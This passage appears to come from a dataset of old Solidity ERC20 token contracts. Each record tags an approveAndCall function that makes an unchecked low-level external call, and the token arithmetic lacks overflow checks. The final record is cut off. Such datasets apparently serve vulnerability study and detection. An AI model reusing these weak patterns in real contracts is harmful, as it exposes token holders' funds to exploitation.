  "content": "pragma solidity ^0.4.13;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract IPchainStandardToken is StandardToken {\n function () {\n return;\n }\n string public version = 'I0.1';\n string public name;\n uint8 public decimals;\n string public symbol;\n function IPchainStandardToken(\n uint256 initialSupply,\n string tokenName,\n uint8 decimalUnits,\n string tokenSymbol\n ) {\n balances[msg.sender] = initialSupply;\n totalSupply = initialSupply;\n name = tokenName;\n decimals = decimalUnits;\n symbol = tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) {\n return false;\n }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) {\nreturn false;\n}\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1617"
  },
  "filename": "37744.sol",
  "content": "pragma solidity ^0.4.11;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n ) {\n balances[msg.sender] = 150000000000000000000000000;\n totalSupply = 150000000000000000000000000;\n name = \"BiBaoToken\";\n decimals = 18;\n symbol = \"BBT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1618"
  },
  "filename": "37786.sol",
  "content": "contract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\npragma solidity ^0.4.15;\ncontract HumanStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1619"
  },
  "filename": "37987.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 2500000000000000;\n totalSupply = 2500000000000000;\n name = \"Solidus\";\n decimals = 8;\n symbol = \"SOLID\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb161a"
  },
  "filename": "37991.sol",
  "content": "contract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract HumanStandardToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb161b"
  },
  "filename": "38281.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract DollHair is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'DOLL1.0';\n function DollHair(\n ) {\n balances[msg.sender] = 30000000000;\n totalSupply = 30000000000;\n name = \"DollHair\";\n decimals = 4;\n symbol = \"DOLL\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb161c"
  },
  "filename": "38310.sol",
  "content": "pragma solidity ^0.4.2;\npragma solidity ^0.4.0;\ncontract OraclizeI {\n address public cbAddress;\n function query(uint _timestamp, string _datasource, string _arg) payable returns (bytes32 _id);\n function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) payable returns (bytes32 _id);\n function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) payable returns (bytes32 _id);\n function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) payable returns (bytes32 _id);\n function queryN(uint _timestamp, string _datasource, bytes _argN) payable returns (bytes32 _id);\n function queryN_withGasLimit(uint _timestamp, string _datasource, bytes _argN, uint _gaslimit) payable returns (bytes32 _id);\n function getPrice(string _datasource) returns (uint _dsprice);\n function getPrice(string _datasource, uint gaslimit) returns (uint _dsprice);\n function useCoupon(string _coupon);\n function setProofType(byte _proofType);\n function setConfig(bytes32 _config);\n function setCustomGasPrice(uint _gasPrice);\n function randomDS_getSessionPubKeyHash() returns (bytes32);\n}\ncontract OraclizeAddrResolverI {\n function getAddress() returns (address _addr);\n}\ncontract usingOraclize {\n uint constant day = 60 * 60 * 24;\n uint constant week = 60 * 60 * 24 * 7;\n uint constant month = 60 * 60 * 24 * 30;\n byte constant proofType_NONE = 0x00;\n byte constant proofType_TLSNotary = 0x10;\n byte constant proofType_Android = 0x20;\n byte constant proofType_Ledger = 0x30;\n byte constant proofType_Native = 0xF0;\n byte constant proofStorage_IPFS = 0x01;\n uint8 constant networkID_auto = 0;\n uint8 constant networkID_mainnet = 1;\n uint8 constant networkID_testnet = 2;\n uint8 constant networkID_morden = 2;\n uint8 constant networkID_consensys = 161;\n OraclizeAddrResolverI OAR;\n OraclizeI oraclize;\n modifier oraclizeAPI {\n if ((address(OAR) == 0) || (getCodeSize(address(OAR)) == 0)) oraclize_setNetwork(networkID_auto);\n oraclize = OraclizeI(OAR.getAddress());\n _;\n }\n modifier coupon(string code){\n oraclize = OraclizeI(OAR.getAddress());\n oraclize.useCoupon(code);\n _;\n }\n function oraclize_setNetwork(uint8 networkID) internal returns (bool){\n if (getCodeSize(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed) > 0) {\n OAR = OraclizeAddrResolverI(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed);\n oraclize_setNetworkName(\"eth_mainnet\");\n return true;\n }\n if (getCodeSize(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1) > 0) {\n OAR = OraclizeAddrResolverI(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1);\n oraclize_setNetworkName(\"eth_ropsten3\");\n return true;\n }\n if (getCodeSize(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e) > 0) {\n OAR = OraclizeAddrResolverI(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e);\n oraclize_setNetworkName(\"eth_kovan\");\n return true;\n }\n if (getCodeSize(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48) > 0) {\n OAR = OraclizeAddrResolverI(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48);\n oraclize_setNetworkName(\"eth_rinkeby\");\n return true;\n }\n if (getCodeSize(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475) > 0) {\n OAR = OraclizeAddrResolverI(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475);\n return true;\n }\n if (getCodeSize(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF) > 0) {\n OAR = OraclizeAddrResolverI(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF);\n return true;\n }\n if (getCodeSize(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA) > 0) {\n OAR = OraclizeAddrResolverI(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA);\n return true;\n }\n return false;\n }\n function __callback(bytes32 myid, string result) {\n __callback(myid, result, new bytes(0));\n }\n function __callback(bytes32 myid, string result, bytes proof) {\n }\n function oraclize_useCoupon(string code) oraclizeAPI internal {\n oraclize.useCoupon(code);\n }\n function oraclize_getPrice(string datasource) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource);\n }\n function oraclize_getPrice(string datasource, uint gaslimit) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource, gaslimit);\n }\n function oraclize_query(string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice * 200000) return 0;\n return oraclize.query.value(price)(0, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice * 200000) return 0;\n return oraclize.query.value(price)(timestamp, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice * gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice * gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(0, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice * 200000) return 0;\n return oraclize.query2.value(price)(0, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice * 200000) return 0;\n return oraclize.query2.value(price)(timestamp, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice * gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(timestamp, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice * gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(0, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice * 200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice * 200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice * gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice * gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice * 200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice * 200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice * gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, 